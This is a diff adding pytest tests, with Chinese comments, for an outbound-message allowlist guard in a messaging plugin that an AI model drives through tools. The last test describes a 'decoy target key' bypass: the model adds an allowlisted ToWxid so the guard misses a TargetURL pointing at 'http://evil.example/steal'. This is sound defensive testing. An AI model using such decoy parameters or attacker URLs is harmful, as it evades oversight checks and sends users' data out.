@@ -16,6 +16,9 @@ Go + swagger：``encoding/json`` 对结构体字段**大小写不敏感**，``{"
 
 from __future__ import annotations
 
+import asyncio
+import types
+
 import pytest
 
 from plugin.core import outbound_guard as og
@@ -78,3 +81,82 @@ def test_webhook_test_is_no_longer_read_only(allowlist) -> None:
 def test_read_only_endpoints_still_pass(allowlist) -> None:
     assert og.is_read_only("/Login/HeartBeat") is True
     og.guard("/Login/HeartBeat", {})  # 不抛
+
+
+# ---------------------------------------------------------------- 2026-10-19 加固
+
+
+def test_path_targets_are_checked(allowlist) -> None:
+    """路径参数移到 URL 后仍是收件人，必须过白名单。"""
+    endpoint = "/XiaoWei/Chat/Sessions/{session_id}/Messages"
+    og.guard(endpoint, {}, "acct", path_targets=("ok@chatroom",))
+    with pytest.raises(netguard.GuardError):
+        og.guard(endpoint, {}, "acct", path_targets=("prod@chatroom",))
+
+
+def test_missing_target_keys_are_checked(allowlist) -> None:
+    """群主转让/视频号私信的真正接收方原先不在 TARGET_KEYS ⇒ 白名单只看了群 ID。"""
+    with pytest.raises(netguard.GuardError):
+        og.guard("/Group/SendTransferGroupOwner",
+                 {"QID": "ok@chatroom", "NewOwnerUserName": "wxid_victim"}, "acct")
+    with pytest.raises(netguard.GuardError):
+        og.guard("/Finder/FinderSendText",
+                 {"FinderUsername": "victim_finder", "Text": "hi"}, "acct")
+
+
+def test_target_overflow_fails_closed(allowlist) -> None:
+    """超过硬上限不能静默截断后放行（第 65 个目标会完全逃过核对）。"""
+    with pytest.raises(netguard.GuardError) as caught:
+        og.guard("/Msg/SendTxt", {"ToWxids": [f"u{i}" for i in range(65)]}, "acct")
+    assert "上限" in str(caught.value)
+
+
+def test_captured_allowlist_does_not_reread_ambient_env(allowlist) -> None:
+    """发送任务掉出 profile scope 后，必须继续用连接期捕获的那份白名单。"""
+    netguard.check_outbound_allowed("ok@chatroom", allowed=("ok@chatroom",))
+    with pytest.raises(netguard.GuardError):
+        netguard.check_outbound_allowed("prod@chatroom", allowed=("ok@chatroom",))
+    # 空 tuple = 白名单被显式关闭（不是「回落到 env」）
+    netguard.check_outbound_allowed("prod@chatroom", allowed=())
+
+
+def test_schema_filter_drops_decoy_target_keys() -> None:
+    """模型给工具塞 schema 外参数时，不得原样进请求体。
+
+    这是「诱饵目标键」绕过收口：``/Msg/StartAutoSync`` 的 schema 只有 TargetURL，
+    模型另塞一个白名单内的 ``ToWxid``，闸会只看到诱饵、放行真正的 TargetURL。
+    通用 handler 现在只保留 schema 声明的键。
+    """
+    from plugin.toolkit import registry
+
+    class _Client:
+        def __init__(self) -> None:
+            self.calls: list[tuple[str, dict]] = []
+
+        async def call(self, endpoint: str, body: dict, method: str = "POST"):
+            self.calls.append((endpoint, body))
+            return {"Code": 0, "Data": {}}
+
+    class _Ctx:
+        def __init__(self) -> None:
+            self.tools: dict[str, dict] = {}
+
+        def register_tool(self, **kwargs) -> None:
+            self.tools[kwargs["name"]] = kwargs
+
+    client = _Client()
+    adapter = types.SimpleNamespace(_clients={"acct": client})
+    ctx = _Ctx()
+    registry.register_generic_tools(ctx, lambda: adapter, [{
+        "name": "wpp_start_auto_sync",
+        "endpoint": "/Msg/StartAutoSync",
+        "description": "d",
+        "params": {"TargetURL": {"type": "string"}},
+    }])
+    asyncio.run(ctx.tools["wpp_start_auto_sync"]["handler"](
+        account_id="acct",
+        TargetURL="http://evil.example/steal",
+        ToWxid="ok@chatroom",
+    ))
+    assert client.calls == [("/Msg/StartAutoSync",
+                             {"TargetURL": "http://evil.example/steal"})]
